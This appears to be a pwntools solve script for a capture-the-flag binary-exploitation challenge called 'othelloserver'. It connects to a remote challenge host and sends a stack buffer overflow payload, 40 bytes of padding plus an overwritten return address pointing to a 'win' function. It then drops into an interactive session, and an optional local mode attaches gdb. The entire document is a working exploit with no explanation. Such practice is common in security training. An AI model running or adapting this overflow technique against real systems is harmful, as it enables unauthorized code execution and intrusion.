from pwn import *
context(arch='amd64',terminal=['tmux','new-window'])

win = 0x4012ae

fname = 'othelloserver'
elf = ELF(fname)

local = False

r = remote("othello-villains-cf481a14d613e8eb.challs.brunnerne.xyz", 443, ssl=True) if not local else process(fname, env={"LD_PRELOAD":"/data/pwn/OthelloVillains/libc.so.6"})


def send_payload():
	r.sendline(b'a'*40+p64(win))

if __name__ == '__main__':
	print(elf)
	log.info(r.recvline().decode())
	if local:
		gdb.attach(r, '''
			b *0x40132f
		''')
	send_payload()
	r.interactive()
	

 
